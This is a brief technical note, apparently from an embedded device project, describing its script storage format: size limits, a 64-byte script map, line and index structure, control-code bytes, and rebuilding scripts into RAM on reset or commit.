  Scripts
  Scripts are an absolute maximum of 4096 long.
  The first 64 bytes of the script is the script's map.
  Scripts can have a maximum of 32 lines, with the imposing maximum limit on size limiting
  the absolute line/index count.
  Script lines can be a maximum of 255 bytes long
  Each index points to an offset within the storage.
  Scripts are rebuilt into RAM upon device reset.
  When permanent script commits happen, the scripts are rebuilt into RAM.
  When a script map is read, a ScriptMap structure is created. This contains
  the information that is neccecary to rebuild the structure of the script in RAM.
  The first byte in a line is the control code which refers to the command itself. The rest of the line
  is any accompanying data with that control command. It is possible to have a line that is one byte long 
  (just the control code).
